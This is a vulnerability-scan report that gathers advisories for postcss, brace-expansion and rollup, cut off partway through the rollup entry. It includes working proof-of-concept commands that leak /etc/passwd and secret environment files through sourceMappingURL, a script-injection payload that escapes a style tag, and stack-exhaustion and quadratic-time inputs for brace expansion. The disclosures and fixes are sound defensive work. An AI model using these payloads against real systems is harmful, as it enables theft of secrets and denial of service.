PostCSS's `PreviousMap` parses the `/*# sourceMappingURL=PATH */` comment from any CSS string passed to `process()` and dereferences `PATH` against the local filesystem with no scheme, allowlist, or traversal check. An attacker who controls the CSS input can cause the host process to read any file readable by Node and leak the first ~10 bytes of its content through the resulting `JSON.parse` `SyntaxError` message. The bug also yields a precise file-existence oracle and a controllable-read primitive that may be combined with large-file targets for DoS. The behaviour is triggered with PostCSS's default options — no `from`, no `map`, no plugins required — and is therefore reachable from any pipeline that runs untrusted CSS through PostCSS (CMS themes, user-uploaded styles, browser-extension/userstyle processors, build pipelines for third-party packages, blog comment renderers, etc.).

## Details

The dangerous chain lives in `lib/previous-map.js` and is wired into every `Input` construction at `lib/input.js:70-77`.

`Input` constructor (`lib/input.js:70-77`):

```js
if (pathAvailable && sourceMapAvailable) {
  let map = new PreviousMap(this.css, opts)
  if (map.text) {
    this.map = map
    let file = map.consumer().file
    if (!this.file && file) this.file = this.mapResolve(file)
  }
}
```

`PreviousMap` constructor (`lib/previous-map.js:17-29`):

```js
constructor(css, opts) {
  if (opts.map === false) return
  this.loadAnnotation(css)
  this.inline = this.startWith(this.annotation, 'data:')

  let prev = opts.map ? opts.map.prev : undefined
  let text = this.loadMap(opts.from, prev)
  ...
}
```

Note `opts.map === false` is the only short-circuit. With default options (`opts.map === undefined`), the rest of the constructor — including the filesystem read — executes.

`loadAnnotation` (`lib/previous-map.js:72-84`) extracts the URL **without sanitisation**:

```js
loadAnnotation(css) {
  let comments = css.match(/\/\*\s*# sourceMappingURL=/g)
  if (!comments) return
  let start = css.lastIndexOf(comments.pop())
  let end = css.indexOf('*/', start)
  if (start > -1 && end > -1) {
    this.annotation = this.getAnnotationURL(css.substring(start, end))
  }
}
```

`getAnnotationURL` (`lib/previous-map.js:59-61`) only strips the `/*# sourceMappingURL=` prefix and trims whitespace — no scheme check, no path normalisation, no allowlist.

`loadMap` (`lib/previous-map.js:124-128`) — when `prev` is absent and the annotation is not an inline `data:` URI:

```js
} else if (this.annotation) {
  let map = this.annotation
  if (file) map = join(dirname(file), map)
  return this.loadFile(map)
}
```

* If `opts.from` is unset, `file` is undefined and the raw attacker-supplied path (e.g. `/etc/passwd`) is used directly.
* If `opts.from` is set, `path.join(dirname(file), attackerPath)` is used. `path.join` does **not** block `..` segments, so `../../../../../etc/passwd` resolves outside the intended directory.

`loadFile` (`lib/previous-map.js:86-92`) is the sink:

```js
loadFile(path) {
  this.root = dirname(path)
  if (existsSync(path)) {
    this.mapFile = path
    return readFileSync(path, 'utf-8').toString().trim()
  }
}
```

The bytes are stored in `this.text`. `Input` immediately invokes `map.consumer()` (`lib/input.js:74`), which constructs a `SourceMapConsumer` (`lib/previous-map.js:33`). When the file is not valid source-map JSON (the common case), `source-map-js` calls `JSON.parse`, and V8's `SyntaxError` message embeds the first ~10 bytes of the file content:

```
Unexpected token 'r', "root:x:0:0"... is not valid JSON
```

This error is propagated back to the caller. Any application that surfaces PostCSS errors (logs, HTTP 500 responses, build-tool output, debug pages) discloses those bytes to the attacker.

Trust-boundary analysis:
* Attacker controls: CSS input passed to `postcss().process(css, opts?)`.
* Server resources: any file readable by the Node process — typically including app config, environment files, SSH keys, `/etc/passwd`, `/proc/self/environ`, etc.
* No mitigations: there is no path validation, scheme allowlist, traversal check, or symlink check. The only relevant check (`startWith(annotation, 'data:')`) routes inline URIs to `decodeInline`; everything else hits `loadFile`.

Primitives obtained:
* (a) **Arbitrary file read** — bytes loaded into Node memory.
* (b) **Information disclosure** — first ~10 bytes leaked via `JSON.parse` `SyntaxError` message.
* (c) **File-existence oracle** — non-existent paths return silently from `loadFile` (`existsSync` is false → returns undefined → no map text → no consumer call → no error). Existent non-JSON paths throw. Existent JSON paths succeed silently. Three distinguishable states.
* (d) **DoS primitive** — directing the read at `/dev/zero`, very large files, or device files can stall or crash the process.

## PoC

All commands executed against this repository's HEAD (postcss 8.5.10) on Node v22.12.0.

**Vector 1 — Absolute path, default options (no `from`, no `map`):**

```bash
$ node -e 'const p=require("postcss"); \
  try { p().process("a{color:red}\n/*# sourceMappingURL=/etc/passwd */"); } \
  catch(e){console.log(e.message)}'
Unexpected token 'r', "root:x:0:0"... is not valid JSON
```

The first 10 bytes of `/etc/passwd` (`root:x:0:0`) are leaked.

**Vector 2 — Relative `..` traversal with `opts.from` set (simulates a build pipeline that pins `from` to the source file):**

```bash
$ node -e 'const p=require("postcss"); \
  p().process("a{color:red}\n/*# sourceMappingURL=../../../../../etc/passwd */", \
              {from:"/var/www/html/styles/main.css", map:{inline:false}}) \
   .catch(e=>console.log(e.message))'
Unexpected token 'r', "root:x:0:0"... is not valid JSON
```

`path.join('/var/www/html/styles', '../../../../../etc/passwd')` resolves to `/etc/passwd`.

**Vector 3 — File-existence oracle:**

```bash
# Existing non-JSON file → throws (file confirmed to exist)
$ node -e 'require("postcss")().process("a{}\n/*# sourceMappingURL=/etc/passwd */")'
SyntaxError: Unexpected token 'r', "root:x:0:0"... is not valid JSON

# Non-existent file → returns silently (file confirmed absent)
$ node -e 'r=require("postcss")().process("a{}\n/*# sourceMappingURL=/no/such/file */"); console.log("ok")'
ok
```

**Vector 4 — Custom file-content leak:**

```bash
$ printf 'API_KEY=sk-secret-12345\n' > /tmp/server-secret.env
$ node -e 'require("postcss")().process("a{}\n/*# sourceMappingURL=/tmp/server-secret.env */")' 2>&1 | head -1
SyntaxError: Unexpected token 'A', "API_KEY=sk"... is not valid JSON
```

The first 10 bytes of `/tmp/server-secret.env` (`API_KEY=sk`) are leaked — sufficient to confirm a token's presence and, in many cases, recover its prefix.

**Filesystem-call trace** (proves the read happens with no opts at all):

```js
const fs = require('fs');
const orig = fs.readFileSync;
fs.readFileSync = function(p){
  if (typeof p==='string' && p.startsWith('/etc')) console.log('[FILE READ]:', p);
  return orig.apply(this, arguments);
};
require('postcss')().process('a{}\n/*# sourceMappingURL=/etc/hostname */');
// → [FILE READ]: /etc/hostname
// → SyntaxError: Unexpected token 'D', "Debian-tri"... is not valid JSON
```

## Impact

* **Arbitrary file read** of any file readable by the Node process from any CSS-processing context that accepts attacker-influenced CSS. PostCSS has hundreds of millions of weekly npm downloads and is the standard CSS processor for build tools (webpack `postcss-loader`, vite, parcel, Next.js, Gatsby, etc.) and for runtime CSS-handling libraries (CSS Modules tools, CSS minifiers, theme processors). Any pipeline that runs untrusted user CSS — CMS theme uploads, user-styled blog posts, browser-extension/userstyle services, multi-tenant build farms, third-party-package build pipelines — is exposed.
* **Confidentiality leak** of the first ~10 bytes of the targeted file via `JSON.parse` `SyntaxError`. This is enough to recover SSH-key headers, environment-variable prefixes (`API_KEY=sk…`), `/etc/passwd` records, the start of `/proc/self/environ`, and other high-value secrets, and to fingerprint the host (`Debian-tri…` from `/etc/hostname`).
* **File-existence oracle** with three distinguishable response states (silent success, `JSON.parse` error, no-such-file silence), enabling reconnaissance of the host filesystem layout and confirmation of installed software, user accounts, and configuration files.
* **DoS** by targeting `/dev/zero`, `/proc/kcore`, very large files, or named pipes — `readFileSync` is a synchronous, unbounded read.
* **Default-on**: triggered with `postcss().process(css)` and no options. The only configuration that disables the bug is the explicit, undocumented-for-this-purpose `{ map: false }`.

## Recommended Fix

The root cause is that `loadFile` accepts any path the attacker supplies inside a CSS comment. The annotation is meant for tooling, not for production CSS processing of untrusted input. Two layered fixes:

1. **Refuse traversal/absolute paths in `loadMap`** (defence-in-depth):

   ```js
   // lib/previous-map.js
   loadMap(file, prev) {
     if (prev === false) return false
     if (prev) { /* unchanged */ }
     else if (this.inline) {
       return this.decodeInline(this.annotation)
     } else if (this.annotation) {
       let annotation = this.annotation
       // Reject schemes (other than data:, handled above) and absolute paths.
       if (/^[a-zA-Z][a-zA-Z0-9+.-]*:/.test(annotation)) return
       if (require('path').isAbsolute(annotation)) return
       if (!file) return  // No base path → cannot safely resolve.
       const base = require('path').resolve(require('path').dirname(file))
       const resolved = require('path').resolve(base, annotation)
       // Refuse anything that escapes the base directory.
       if (resolved !== base && !resolved.startsWith(base + require('path').sep)) {
         return
       }
       return this.loadFile(resolved)
     }
   }
   ```

2. **Require explicit opt-in to follow on-disk source-map annotations**: gate the `loadFile(map)` call in `loadMap` behind an option such as `opts.map.annotation === true` or `opts.map.followAnnotation === true`. Today, the only way to opt out is `{ map: false }`, which also disables in-memory previous-map handling. Inverting the default — only follow disk-resident annotations when explicitly asked — eliminates the entire attack surface for callers that pass untrusted CSS, while preserving build-tool use cases where the annotation is trusted.

A user-facing changelog entry should warn that `postcss().process(untrustedCss)` previously read attacker-controlled paths, and recommend auditing applications that surfaced PostCSS errors to end users.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-69153?s=github&n=postcss&t=npm&vr=%3C%3D8.5.22"><img alt="medium 6.3: CVE--2026--69153" src="https://img.shields.io/badge/CVE--2026--69153-lightgrey?label=medium%206.3&labelColor=fbb552"/></a> <i>Exposure of Sensitive Information to an Unauthorized Actor</i>

<table>
<tr><td>Affected range</td><td><code><=8.5.22</code></td></tr>
<tr><td>Fixed version</td><td><code>8.5.23</code></td></tr>
<tr><td>CVSS Score</td><td><code>6.3</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.451%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>40th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

## Summary

The fix for GHSA-6g55-p6wh-862q added a guard in `lib/previous-map.js` `PreviousMap.loadFile()` that restricts an attacker-controlled `sourceMappingURL` (from a CSS comment) to a `.map` extension and, for untrusted maps, rejects `..` traversal and absolute paths. The traversal/absolute rejection is nested inside `if (cssFile) { ... }`. When PostCSS is invoked without the `from` option, `cssFile` is falsy and that branch is skipped, leaving only the `.map` extension check.

`PreviousMap` is constructed by `lib/input.js` whenever `pathAvailable && sourceMapAvailable` (under Node with source-map available), independent of `opts.from`/`opts.map` (the constructor returns early only for `opts.map === false`). So `postcss([]).process(css)` on attacker CSS reaches `loadFile` with `cssFile` undefined, and an attacker `/*# sourceMappingURL=/abs/path/x.map */` (or `../`-traversing path) is read via `readFileSync`. When the file is valid JSON, its `sources` (filesystem paths) and `sourcesContent` (source contents) are disclosed in the generated source map.

## Affected code (v8.5.22 — the release carrying the GHSA-6g55 fix)

```js
// lib/previous-map.js
loadFile(path, cssFile, trusted) {
  if (!trusted && !this.unsafeMap) {
    if (!/\.map$/i.test(path)) {
      return undefined
    }
    if (cssFile) {                       // guard runs ONLY when `from` is set
      let relativePath = relative(dirname(cssFile), path)
      if (relativePath === '..' ||
          relativePath.startsWith('..' + sep) ||
          isAbsolute(relativePath)) {
        return undefined
      }
    }
  }
  this.root = dirname(path)
  if (existsSync(path)) {
    this.mapFile = path
    return readFileSync(path, 'utf-8').toString().trim()   // sink
  }
}

// loadMap(): untrusted annotation path, trusted=false; file === opts.from
} else if (this.annotation) {
  let map = this.annotation
  if (file) map = join(dirname(file), map)   // no `from` -> map stays the raw URL
  let unknown = this.loadFile(map, file, false)  // file undefined -> cssFile falsy
```

## Proof of concept (verified on postcss 8.5.22)

```js
const postcss = require('postcss')
const fs = require('fs')

// a 'secret' sourcemap OUTSIDE any expected tree (stand-in for another project's .map)
const secret = '/tmp/pcpoc/secret_out_of_tree.map'
fs.writeFileSync(secret, JSON.stringify({
  version: 3, sources: ['/etc/REAL_PATH_LEAK'], mappings: '', names: [],
  sourcesContent: ['TOP_SECRET_abcdef']
}))

const css = 'a{color:red}\n/*# sourceMappingURL=' + secret + ' */'
const leaks = m => m && JSON.stringify(m.toJSON ? m.toJSON() : m).includes('TOP_SECRET_abcdef')

;(async () => {
  // A) NO `from`  -> guard skipped -> arbitrary absolute .map read + disclosed
  const a = await postcss([]).process(css, { map: true })
  console.log('no from   -> leaked:', !!leaks(a.map))   // true

  // B) WITH `from` -> guard active -> blocked
  const b = await postcss([]).process(css, { from: '/tmp/pcpoc/in.css', map: true })
  console.log('with from -> leaked:', !!leaks(b.map))    // false
})()
```

Observed output on postcss 8.5.22:

```
no from   -> leaked: true      # sourcesContent 'TOP_SECRET_abcdef' AND sources '/etc/REAL_PATH_LEAK' appear in result.map
with from -> leaked: false     # guard rejects the absolute path
```

`../` traversal (no `from`) also succeeds; non-`.map` targets (`.txt`, `?x=.map`, `#.map`) are blocked by the `.map` check. The tested build contains the GHSA-6g55 fix (`this.json = JSON.parse(...)` in `loadMap`, `consumer()` uses `this.json || this.text`), so this is a residual of that fix.

## Impact

Arbitrary `.map`-file read (absolute path or `../` traversal) and disclosure of the target map's `sources` (local filesystem paths) and `sourcesContent` (source) into the generated source map, for any consumer that runs PostCSS on attacker-influenced CSS without a `from` option and exposes `result.map` (online CSS playgrounds, minify/lint services, string-input build steps). Bounded to files ending in `.map` that parse as JSON.

## Suggested fix

Apply the traversal/absolute-path rejection to the untrusted map path regardless of whether `cssFile` is present (resolve against `process.cwd()` when there is no `cssFile`, and reject absolute paths and `..` escape in all untrusted cases), or refuse to load an untrusted external map when no base file is known.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-41305?s=github&n=postcss&t=npm&vr=%3C8.5.10"><img alt="medium 6.1: CVE--2026--41305" src="https://img.shields.io/badge/CVE--2026--41305-lightgrey?label=medium%206.1&labelColor=fbb552"/></a> <i>Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')</i>

<table>
<tr><td>Affected range</td><td><code><8.5.10</code></td></tr>
<tr><td>Fixed version</td><td><code>8.5.10</code></td></tr>
<tr><td>CVSS Score</td><td><code>6.1</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.205%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>11th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

# PostCSS: XSS via Unescaped `</style>` in CSS Stringify Output

## Summary

PostCSS v8.5.5 (latest) does not escape `</style>` sequences when stringifying CSS ASTs. When user-submitted CSS is parsed and re-stringified for embedding in HTML `<style>` tags, `</style>` in CSS values breaks out of the style context, enabling XSS.

## Proof of Concept

```javascript
const postcss = require('postcss');

// Parse user CSS and re-stringify for page embedding
const userCSS = 'body { content: "</style><script>alert(1)</script><style>"; }';
const ast = postcss.parse(userCSS);
const output = ast.toResult().css;
const html = `<style>${output}</style>`;

console.log(html);
// <style>body { content: "</style><script>alert(1)</script><style>"; }</style>
//
// Browser: </style> closes the style tag, <script> executes
```

**Tested output** (Node.js v22, postcss v8.5.5):
```
Input: body { content: "</style><script>alert(1)</script><style>"; }
Output: body { content: "</style><script>alert(1)</script><style>"; }
Contains </style>: true
```

## Impact

Impact non-bundler use cases since bundlers for XSS on their own. Requires some PostCSS plugin to have malware code, which can inject XSS to website.

## Suggested Fix

Escape `</style` in all stringified output values:
```javascript
output = output.replace(/<\/(style)/gi, '<\\/$1');
```

## Credits
Discovered and reported by [Sunil Kumar](https://tharvid.in) ([@<!-- -->TharVid](https://github.com/TharVid))

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2023-44270?s=github&n=postcss&t=npm&vr=%3C8.4.31"><img alt="medium 5.3: CVE--2023--44270" src="https://img.shields.io/badge/CVE--2023--44270-lightgrey?label=medium%205.3&labelColor=fbb552"/></a> <i>Improper Neutralization of Line Delimiters</i>

<table>
<tr><td>Affected range</td><td><code><8.4.31</code></td></tr>
<tr><td>Fixed version</td><td><code>8.4.31</code></td></tr>
<tr><td>CVSS Score</td><td><code>5.3</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.973%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>63rd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

An issue was discovered in PostCSS before 8.4.31. It affects linters using PostCSS to parse external Cascading Style Sheets (CSS). There may be `\r` discrepancies, as demonstrated by `@<!-- -->font-face{ font:(\r/*);}` in a rule.

This vulnerability affects linters using PostCSS to parse external untrusted CSS. An attacker can prepare CSS in such a way that it will contains parts parsed by PostCSS as a CSS comment. After processing by PostCSS, it will be included in the PostCSS output in CSS nodes (rules, properties) despite being originally included in a comment.

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 2" src="https://img.shields.io/badge/H-2-e25d68"/> <img alt="medium: 1" src="https://img.shields.io/badge/M-1-fbb552"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>brace-expansion</strong> <code>5.0.9</code> (npm)</summary>

<small><code>pkg:npm/brace-expansion@5.0.9</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2026-102278?s=github&n=brace-expansion&t=npm&vr=%3E%3D4.0.0%2C%3C5.0.11"><img alt="high 7.5: CVE--2026--102278" src="https://img.shields.io/badge/CVE--2026--102278-lightgrey?label=high%207.5&labelColor=e25d68"/></a> <i>Uncontrolled Resource Consumption</i>

<table>
<tr><td>Affected range</td><td><code>>=4.0.0<br/><5.0.11</code></td></tr>
<tr><td>Fixed version</td><td><code>5.0.11</code></td></tr>
<tr><td>CVSS Score</td><td><code>7.5</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.491%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>43rd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

### Summary

`expand_()` recurses once per level of brace *nesting*. Deeply nested input exhausts the native stack and crashes the process.

This is distinct from CVE-2026-14257 / GHSA-mh99-v99m-4gvg, which made the *tail* iterative (recursion on `m.post`, driven by how many groups are chained). Nesting depth drives a different recursion that the tail fix never touched, so the documented constant-stack-depth guarantee only ever covered chained input, not nested input.

It is also distinct from GHSA-6j4f-fj2g-mc7p, which fixed recursion in `parseCommaParts()`. Both payloads below still crash with that fix applied.

### Two recursion sites

**Comma members.** Each alternative of a brace set is expanded by a recursive call, so nesting a set inside every alternative recurses once per level:

```js
expand('{a,'.repeat(4000) + 'z' + '}'.repeat(4000))
// RangeError: Maximum call stack size exceeded
```

Crashes at depth 3,907 - about **15.6 KB** of input.

**Single set.** A brace set whose body parses to a single part is expanded by a recursive call before being re-wrapped (`x{{a,b}}y` -> `x{a}y x{b}y`), which recurses once per nesting level:

```js
expand('{'.repeat(3200) + 'a,b' + '}'.repeat(3200))
// RangeError: Maximum call stack size exceeded
```

Crashes at depth 3,125 - about **6.25 KB** of input. This is the cheapest stack-exhaustion payload known against this package: roughly a quarter the input of GHSA-6j4f-fj2g-mc7p (29 KB), and about a tenth of minimatch's `MAX_PATTERN_LENGTH` (65,536).

### Why `max` and `maxLength` do not help

Both crashes happen while recursing into sub-expansions, before the result set grows. The payloads produce almost no output - the single-set case yields 2 results - so neither bound is ever the limiter. `expand(payload, { max: 1, maxLength: 1 })` still overflows.

### Impact

Any application passing an untrusted string to `expand()`, directly or through `minimatch` / `glob` as a user-supplied glob pattern, can be crashed. In Node a `RangeError` the application does not catch terminates the process, so a server globbing user input is exposed to remote unauthenticated denial of service.

Availability only. No code execution, no data exposure.

### Affected versions

Verified affected on 1.1.18, 2.1.4, 3.0.6 and 5.0.9, at near-identical depths on every line (single set: 3,125 on all four; comma members: 3,907-4,102). Not a regression from any recent fix - the gap predates them.

### Patch

A `maxDepth` bound (default `EXPANSION_MAX_DEPTH`) is threaded through `expand_()`. Past the cap a group is treated as non-expanding and returned literally, which is how the parser already handles a group that cannot expand. This matches the existing `max` / `maxLength` caps, which truncate rather than throw, so `expand()` continues never to throw on any input.

The default sits far above any realistic nesting depth and well below the crash threshold.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-102276?s=github&n=brace-expansion&t=npm&vr=%3E%3D4.0.0%2C%3C5.0.10"><img alt="high 7.5: CVE--2026--102276" src="https://img.shields.io/badge/CVE--2026--102276-lightgrey?label=high%207.5&labelColor=e25d68"/></a> <i>Uncontrolled Resource Consumption</i>

<table>
<tr><td>Affected range</td><td><code>>=4.0.0<br/><5.0.10</code></td></tr>
<tr><td>Fixed version</td><td><code>5.0.10</code></td></tr>
<tr><td>CVSS Score</td><td><code>7.5</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.455%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>40th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

### Summary

`parseCommaParts()` can exhaust the native stack and crash the process. There are two distinct ways to trigger it, both reachable from a single untrusted pattern string.

This is the parsing-side counterpart to CVE-2026-14257 / GHSA-mh99-v99m-4gvg. That fix made `expand_()` iterative and documented a constant-stack-depth guarantee, but `parseCommaParts()` was left recursive, so the guarantee only held for one of the two parsing paths.

### Vector 1 - unbounded recursion on `post`

`parseCommaParts()` recursed on the remainder of the string once per brace group:

```js
const postParts = parseCommaParts(post)   // unbounded
```

A brace group containing many comma-separated groups drives one recursion level per group:

```js
expand('{' + '{a},'.repeat(7000) + 'b}')
// RangeError: Maximum call stack size exceeded
```

About 7,300 repetitions - roughly 29 KB of input - is enough on Node 24; roughly 6,300 (25 KB) on Node 18. The threshold is identical on every affected release line.

### Vector 2 - `push.apply` with an unbounded array

Even with the recursion removed, `parseCommaParts()` spread whole arrays into an argument list:

```js
p.push.apply(p, postParts)
parts.push.apply(parts, p)
```

`Function.prototype.apply` places one argument per element on the stack, so a single large array overflows it. This needs **no recursion depth at all** - the following reaches a recursion depth of exactly 1:

```js
expand('{{x},' + 'a,'.repeat(125000) + 'b}')
// RangeError: Maximum call stack size exceeded
```

Threshold is about 124,300 repetitions (~249 KB). This vector was not part of the original report; it was found while verifying the fix. A patch that only de-recurses but keeps `push.apply` leaves a working denial of service behind.

### Why `max` and `maxLength` do not help

Both crashes happen during **parsing**, before any expansion. The payloads produce one result per group, so output size grows linearly with input and is never the limiter. `expand(payload, { max: 1, maxLength: 1 })` still overflows.

### Impact

Any application that passes an untrusted string to `expand()` - directly, or through `minimatch` / `glob` where it is a user-supplied glob pattern - can be crashed. In Node, a `RangeError` that the application does not catch terminates the process, so a server that globs user input is exposed to remote unauthenticated denial of service.

`minimatch`'s own `MAX_PATTERN_LENGTH` cap (65,536) does not help against vector 1: the overflow threshold sits well below it. Confirmed on minimatch 10.2.6 - a 64,003-byte pattern passes the length check and overflows both `minimatch.braceExpand()` and `new minimatch.Minimatch()`.

This is an availability-only issue. No code execution and no data exposure.

### Not a regression

5.0.8 and 5.0.9 overflow at the same repetition count, so the gap predates the recent advisories; those fixes simply did not reach it. Verified affected on 1.1.18, 2.1.4, 3.0.6, 5.0.8 and 5.0.9, all at an identical threshold.

### Patch

`parseCommaParts()` is rewritten as a loop that carries the partial part across chunks, and every array append uses an element-by-element loop rather than `push.apply`. The redundant `if (!str) return ['']` guard is dropped - the loop returns `['']` for the empty string on its own.

Equivalence of the old and new implementations was checked by differential testing: exhaustive over every string of `{`, `}`, `,`, `a` up to length 7 plus 300,000 random inputs - 322,000 cases, zero mismatches.

### Severity note

Scored 7.5 High under CVSS 3.1 for consistency with the other availability advisories on this package (GHSA-mh99-v99m-4gvg, GHSA-rgw5-rvv9-x895), which use the same vector. The reporter self-assessed 6.9 Medium under CVSS 4.0 (`CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N`).

### Credit

Reported by baeseungwon1010, with a working proof of concept and a proposed patch. Vector 2 was identified during maintainer verification.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-102277?s=github&n=brace-expansion&t=npm&vr=%3E%3D4.0.0%2C%3C5.0.12"><img alt="medium 5.3: CVE--2026--102277" src="https://img.shields.io/badge/CVE--2026--102277-lightgrey?label=medium%205.3&labelColor=fbb552"/></a> <i>Uncontrolled Resource Consumption</i>

<table>
<tr><td>Affected range</td><td><code>>=4.0.0<br/><5.0.12</code></td></tr>
<tr><td>Fixed version</td><td><code>5.0.12</code></td></tr>
<tr><td>CVSS Score</td><td><code>5.3</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.428%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>38th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

### Summary

Expanding `{a},b}`-shaped input takes time quadratic in the number of literal `}` characters, blocking the event loop.

Bash preserves a quirk where a brace group followed by a comma set still expands (`{a},b}`). The parser implements this by rewriting the string and restarting the scan. Each pass absorbs exactly one `}` and re-scans from the beginning, so `n` trailing braces cost `n` full passes.

### Reproduction

```js
const build = n => '{a}' + '}'.repeat(n) + ',z}'

for (const n of [8000, 16000, 32000, 64000, 128000]) {
  const t = Date.now()
  expand(build(n))
  console.log(n, Date.now() - t + 'ms')
}
```

| n | input | time | results |
|---|---|---|---|
| 8,000 | 8 KB | 110 ms | 2 |
| 16,000 | 16 KB | 446 ms | 2 |
| 32,000 | 32 KB | 1.7 s | 2 |
| 64,000 | 64 KB | 6.9 s | 2 |
| 128,000 | 128 KB | **27.7 s** | 2 |

`ms/n^2` is flat at ~1.7 and each doubling of `n` costs exactly 4.0x - quadratic. 128 KB of input blocks the event loop for nearly half a minute to produce two results.

### Mechanism

Instrumenting the rewrite branch confirms it runs exactly `n + 1` times, once per literal `}`, each re-scanning the whole string.

There is a second multiplier. The rewrite replaces the group's closing `}` with the internal `escClose` sentinel, which is `'\0CLOSE' + Math.random() + '\0'` - about 25 characters. The working string therefore *grows* by ~25 characters on every pass:

| n | input length | final string length |
|---|---|---|
| 1,000 | 1,006 | 26,006 |
| 8,000 | 8,006 | 208,006 |

So the input is inflated roughly 26x, and that factor multiplies both the quadratic constant and peak memory. This makes it partly a memory-pressure issue as well as a CPU one.

### Why `max` and `maxLength` do not help

The cost is in parsing, before the result set exists. The payload yields 2 results regardless of size, so neither bound is ever reached.

### Impact

An application passing an untrusted pattern to `expand()`, directly or through `minimatch` / `glob`, can have its event loop blocked for tens of seconds by a payload well under minimatch's 65,536-character cap. For a single-threaded Node server that is a full stall, not just a slow request.

Degraded availability rather than a crash - the process recovers once the expansion completes.

### Affected versions

Verified affected on 1.1.18, 2.1.4, 3.0.6 and 5.0.9, all within a few percent of each other (~460-490 ms at n=16,000).

### Patch

The rewrite loop gets an iteration bound. Past the cap the remaining string is treated as non-expanding and returned literally, consistent with the existing `max` / `maxLength` caps, which truncate rather than throw.

Note this bounds the number of passes, not the cost of each: worst-case work remains proportional to `cap x input length`. The cap is set low enough that the residual is bounded in practice, and far above what any realistic `{a},b}` input needs.

### Severity note

Scored 5.3 Medium (`A:L`) for consistency with GHSA-3jxr-9vmj-r5cp, the other algorithmic-complexity advisory on this package (CWE-407), which uses the same vector. The stack-exhaustion advisories on this package score `A:H` because they crash the process outright; this one stalls it.

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 2" src="https://img.shields.io/badge/H-2-e25d68"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>rollup</strong> <code>3.29.4</code> (npm)</summary>

<small><code>pkg:npm/rollup@3.29.4</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2026-27606?s=github&n=rollup&t=npm&vr=%3E%3D3.0.0%2C%3C3.30.0"><img alt="high 8.8: CVE--2026--27606" src="https://img.shields.io/badge/CVE--2026--27606-lightgrey?label=high%208.8&labelColor=e25d68"/></a> <i>Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')</i>

<table>
<tr><td>Affected range</td><td><code>>=3.0.0<br/><3.30.0</code></td></tr>
<tr><td>Fixed version</td><td><code>3.30.0</code></td></tr>
<tr><td>CVSS Score</td><td><code>8.8</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N/E:P</code></td></tr>
<tr><td>EPSS Score</td><td><code>1.651%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>77th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

### Summary
The Rollup module bundler (specifically v4.x and present in current source) is vulnerable to an Arbitrary File Write via Path Traversal. Insecure file name sanitization in the core engine allows an attacker to control output filenames (e.g., via CLI named inputs, manual chunk aliases, or malicious plugins) and use traversal sequences (`../`) to overwrite files anywhere on the host filesystem that the build process has permissions for. This can lead to persistent Remote Code Execution (RCE) by overwriting critical system or user configuration files.

### Details
The vulnerability is caused by the combination of two flawed components in the Rollup core:

1.  **Improper Sanitization**: In `src/utils/sanitizeFileName.ts`, the `INVALID_CHAR_REGEX` used to clean user-provided names for chunks and assets excludes the period (`.`) and forward/backward slashes (`/`, `\`). 
    ```typescript
    // src/utils/sanitizeFileName.ts (Line 3)
    const INVALID_CHAR_REGEX = /[\u0000-\u001F"#$%&*+,:;<=>?[\]^`{|}\u007F]/g;
    ```
    This allows path traversal sequences like `../../` to pass through the sanitizer unmodified.

